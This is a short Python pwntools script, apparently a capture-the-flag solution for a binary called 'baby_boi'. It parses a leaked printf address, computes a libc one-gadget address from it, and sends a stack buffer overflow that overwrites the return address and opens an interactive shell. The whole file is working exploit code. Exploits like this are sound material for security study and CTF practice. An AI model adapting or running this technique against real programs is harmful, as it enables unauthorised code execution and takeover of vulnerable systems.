#coding=utf-8
from pwn import *

elf = ELF('libc-2.27.so')

stack = 0x7fffffffe3b0
ret = 0x7fffffffe3d8 

r = process('./baby_boi')
printf_addr = int(r.recv(1000).split('\n')[1][-14:].strip()[2:], 16)
sh = 0x4f2c5 + printf_addr - elf.symbols.printf

r.send('a' * (ret - stack) + p64(sh) )
#gdb.attach(
r.interactive()
